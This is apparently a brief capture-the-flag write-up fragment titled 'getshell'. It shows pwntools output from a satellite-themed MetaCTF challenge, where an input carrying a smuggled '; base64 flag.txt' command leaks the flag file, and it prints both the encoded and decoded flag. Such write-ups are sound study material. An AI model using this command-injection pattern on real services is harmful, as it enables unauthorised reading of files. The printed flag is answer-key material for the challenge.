# getshell
```
[DEBUG] Received 0x216 bytes:
    b'\n'
    b'[DEBUG] Executing command: ls -l ./satellite/; base64 flag.txt 2>/dev/null\n'
    b'[SCANNING]: ; base64 flag.txt\n'
    b'total 0\n'
    b'drwxr-xr-x    1 nobody   nobody          24 Jun 26 19:37 comms\n'
    b'drwxr-xr-x    1 nobody   nobody          26 Jun 26 19:37 maintenance\n'
    b'drwxr-xr-x    1 nobody   nobody          25 Jun 26 19:37 payload\n'
    b'drwxr-xr-x    1 nobody   nobody          41 Jun 26 19:37 systems\n'
    b'drwxr-xr-x    1 nobody   nobody          24 Jun 26 19:37 telemetry\n'
    b'TWV0YUNURnthN19sM2EkdF9yM2FsX2MwbW00bmRfNG5kX2MwbnRyMGxfdTUzc18zbmNyeXA3MTBu\n'
    b'fQ==\n'
    b'\n'
    b'SATCOM> '
/pip_venv/lib/python3.12/site-packages/pwnlib/log.py:347: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'success')
[+] TWV0YUNURnthN19sM2EkdF9yM2FsX2MwbW00bmRfNG5kX2MwbnRyMGxfdTUzc18zbmNyeXA3MTBufQ==
[+] MetaCTF{a7_l3a$t_r3al_c0mm4nd_4nd_c0ntr0l_u53s_3ncryp710n}
[*] Switching to interactive mode

SATCOM> $

```
![](https://r2.20161023.xyz/pic/20250809123233347.png)